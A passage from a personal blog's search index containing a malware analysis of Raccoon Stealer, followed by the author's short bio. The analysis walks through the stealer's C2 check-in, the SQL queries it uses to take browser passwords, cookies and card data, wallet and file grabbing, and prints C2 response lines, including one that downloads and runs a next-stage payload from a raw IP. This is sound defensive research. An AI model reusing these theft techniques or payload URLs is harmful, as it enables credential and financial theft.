with S-1-5-18 to see if the user is running as a LocalSystem or not. If it is, the function returns 1 and not returns 0 The next few instruction retrieves a decrypted strings: Content-Type: application/x-www-form-urlencoded; charset=utf-8 and */* then calls a function that formats the input with a given pattern, This function is referenced in a lot of places in the sample. this function format the input string with \\r\\n appended to it and calls the function that seems to be that does the formatting procedures and it’s used in so many places Then the malware make a call to a function sub_0040A720 after allocating two regions in the memory .if we navigate to this function we see that it first reference the previously allocated memory and the open the registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\ and read the value MachineGuid and returns it in EAX register then the malware retrieves the username of the current user and makes some formatting to the data before sending it. The formatted data are some information about the victim machine like: machineId=\u003cGUID\u003e|\u003cusername\u003e\u0026confId=\u003cpredefined value\u003e machineId=d8874349-72d5-492c-8d8c-5e6d3a68e127|d01a\u0026configId=59c9737264c0b3209d9193b8ded6c127 configId used is the key used to decrypt the C2 IP address . Now, the first piece of data is ready to be sent to the attacker and the function sub_004079F3 did this. First, the function references the IP of the C2 server and make some comparisons to its beginning to make sure that it’s in a valid format. Then it gets a pointer to / at the end of the IP address and then make a call to InternetOpenW(\"record\",0,0,0) it parameter is the User-Agent of the request sent .now it’s ready to connect to the remote server, so it connects to the remote server over http transfer protocol and port 443, the default for https transfer protocol Then it sends the data to the C2 server set before. The content type sent in the request in the form Content-Type: application/x-www-form-urlencoded; charset=utf-8\\r\\n\\r\\n\\r\\n and the data sent in the OptionalHeader parameter which sent after the request headers. And after sending the data it waits for a response from the server. Then it parses the response for a specific field contain the word Token: if it found it continue running if it is not, it exits. ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:4","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Install required libraries It search for the libs word in the response in order to prepare a legitimate DLL that are required for the malware to run. the command can be in form: libs_nss3:http://{HOSTADDR}/{RANDOM_STRING}/nss3.dll libs_msvcp140:http://{HOSTADDR}/{RANDOM_STRING}/msvcp140.dll libs_vcruntime140:http://{HOSTADDR}/{RANDOM_STRING}/vcruntime140.dll ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:5","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Get victim machine information Then, It retrieves the path of Local AppData C:\\Users\\d01a\\AppData\\Local by calling SHGetFolderPathW from the function sub_0040A323 and format it by adding the word Low at the end of the path then it adds the path to sqlite3.dll and other downloaded DLLs to the PATH environment variables The malware collects information about the system through the function call a sub_004097BB , it search for the word sstmnfo_ in the response of the C2 Server and the data to be collected is determined in the response, after a colon : and a pipe | between the key words of the data. Then, it begin collecting information about the system: The locale information the data is formatted in the following format - Locale: Time zone information the data is formatted in the form: - Time zone: \u003c%c%ld\u003e minutes from GMT OS Version retrieves the OS version by reading the registry key SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName and the data formatted in the form: - OS: \u003c%s OS\u003e system Architecture By calling GetSystemWow64DirectoryW that retrieves the path of of the system directory used by WOW64 that only exist in x64 Architecture. The data formated in form: - Architecture: x\u003c%d Architecture\u003e RAM status gets the memory status by calling GlobalMemoryStatusEx that retrieves both the virtual and physical memory usage and format in the form: - RAM: \u003c%d RAM Usage\u003e MB CPU specifications Using instruction cpuid to retrieve the processor specification. This instruction output depends on the value in the eax register. The call to cpuid with eax = 0x80000002 , 0x80000003 and 0x80000004 gets Processor Brand String .Also it uses GetSystemInfo API to get the number of processors. And send it in the format: - CPU: \u003c%s CPU Brand\u003e (\u003c%d Cores number\u003e cores) Display Get the display information by calling GetSystemMetrics with index 0 to retrieves The width of the screen of the primary display monitor and format it in form: - Display size: \u003c%d\u003ex\u003c%d\u003e Display devices - Display Devices: \u003c%s\u003e Display Name And version Get this information from the registry SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall And the Specific GUID to get the display name and version Then it generate a random value and append it to the content-Type header and save the data to a file to send it to the attacker C2 server That’s all with sstmnfo_ expected functionality. Lets explore the rest of the capabilities of the malware. ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:6","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Steal User information saved in Browser Chrome Based The malware then Loads sqlite3.dll and call the function at sub_00403FAB. This function is basically allocates two regions of memory and get the paths of %AppData% and %LocalAppData% directories and then transfer the flow to another functions lets explore the first function call sub_401B13. It recursively search for User Data directory and then goes to sub_401E26 that have all the functionality. It first start looking for Local State file and reads it and search for \"encrypted_key\":\" in it and in the same way, it did with stats_version\":\" . Then, It starts to resolve some functions from sqlite3.dll to use them. And get the path to Login Data file and copies it to another file. It opens a new database connection to Login Data copied file with sqlite3_open function call then it execute SQL statement: SELECT origin_url, username_value, password_value FROM logins to steal the saved username \u0026 password and its associated origin URL Actually, To execute that SQL statement, sqlite3_step should be called. the return value of sqlite3_step can be different so, it checks if the return value is 100 this means that there is another row of output is available. To retrieve the content of the database a call to sqlite3_column_bytes16 that returns the size of the data and sqlite3_column_text16 to the content as plain text After collecting these data it format it in the following form in a file \\passwords.txt to send it: URL:%s USR:%s PASS:%s In the same way, It get the cookies using the SQL statment: SELECT host_key, path, is_secure , expires_utc, name, encrypted_value FROM cookies and format it in the following form in a file \\cookies.txt to send it: %s TRUE %s %s %s %s %s It gets the autofill content name and value pairs in the same way using the SQL query SELECT name, value FROM autofill and saved the data to a file \\autofill.txt to send it. then, it reads the content of Web Data file to extract Credit Card information using the SQL query: SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards and format in the following form in a file \\CC.txt to send it: NUM:%s HOLDER:%s EXP:%s/%s and it did the whole thing with the files in Default path for the browser FireFox FireFox Browsers are a little bit different so, it collects the data from it but needs to do different steps. First it goes to Profiles and search for cookies.sqlite and it opens it using sqlite3 and get the cookies using SQL query: SELECT host, path, isSecure, expiry, name, value FROM moz_cookies then, The login information from logins.json and dumping the passwords using PK11SDR_Decrypt function call. Then, it goes to formhistory.sqlite to get the Autofill information using SQL query: SELECT fieldname, value FROM moz_formhistory ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:7","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Steal Crypto wallets information If the response has the word wlts_ then, the malware tries to collect all crypto wallets information from the victim. Basically it navigate all the file system searching for a pattern. And in the same way, It navigate the whole system searching for wallet.dat which is a bitcoin wallet. and if it found, sends it to the server. Response be like: wlts_exodus:Exodus;26;exodus;*;*partitio*,*cache*,*dictionar* wlts_atomic:Atomic;26;atomic;*;*cache*,*IndexedDB* wlts_jaxxl:JaxxLiberty;26;com.liberty.jaxx;*;*cache* ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:8","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"grabbing Files If the response has the word grbr_ search for the specified file in the system and upload it to the attacker. the response be like: grbr_dekstop:%USERPROFILE%\\Desktop\\|*.txt, *.doc, *pdf*|-|5|1|0|files grbr_documents:%USERPROFILE%\\Documents\\|*.txt, *.doc, *pdf*|-|5|1|0|files grbr_downloads:%USERPROFILE%\\Downloads\\|*.txt, *.doc, *pdf*|-|5|1|0|files ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:9","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Telegram connection The malware can collect Telegram Desktop application data if the response has the word tlgrm_. tlgrm_Telegram:Telegram Desktop\\tdata|*|*emoji*,*user_data*,*tdummy*,*dumps* It search for a file specified in the response from the server and navigate to it and copy it to send to the attacker. ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:10","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Take screenshot To take a screenshot the response should have the word scrnsht_. First, It resolves APIs from GdiPlus.dll and Gdi32.dll to take a screenshot. All APIs resolved: GdiplusStartup GdipDisposeImage GdipGetImageEncoders GdipGetImageEncodersSize GdipCreateBitmapFromHBITMAP GdipSaveImageToFile BitBlt CreateCompatibleBitmap CreateCompatibleDC DeleteObject GetObjectW SelectObject SetStretchBltMode StretchBlt DC The malware uses these APIs to take a screenshots from the victim system and send them to the attacker ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:11","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Loading Next stage The malware can drop a next stage malware specified in the response from the server containing ldr_. ldr_1:http://94.158.244.119/U4N9B5X5F5K2A0L4L4T5/84897964387342609301.bin|%TEMP%\\|exe The malware open a connection to the server and download the content of the file specified in the response to the system The malware then execute the downloaded file using ShellExecute API call That’s all, The malware clear the files that created and release the allocated memory regions ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:12","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"IOCs: sha256: 022432f770bf0e7c5260100fcde2ec7c49f68716751fd7d8b9e113bf06167e03 51.195.166[.]184 ","date":"2022-09-12","objectID":"/raccoon-stealer/:3:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"References https://any.run/cybersecurity-blog/raccoon-stealer-v2-malware-analysis/ https://bazaar.abuse.ch/sample/022432f770bf0e7c5260100fcde2ec7c49f68716751fd7d8b9e113bf06167e03/ https://blog.sekoia.io/raccoon-stealer-v2-part-2-in-depth-analysis/ https://www.sqlite.org/c3ref/funclist.html https://www.sqlite.org/rescode.html ","date":"2022-09-12","objectID":"/raccoon-stealer/:4:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":null,"content":"About me","date":"2023-01-16","objectID":"/about/","tags":null,"title":"About Me","uri":"/about/"},{"categories":null,"content":"About Me Mohamed Adel is my name, I’m a Computer science student and i’m trying to learn Malware Analysis and reverse engineering. I’m Looking for a remote job/internship. If you have any opportunity, please contact me. ","date":"2023-01-16","objectID":"/about/:0:1","tags":null,"title":"About Me","uri":"/about/"},{"categories":null,"content":"Find Me  Github  LinkedIn  Twitter ","date":"2023-01-16","objectID":"/about/:0:2","tags":null,"title":"About Me","uri":"/about/"}]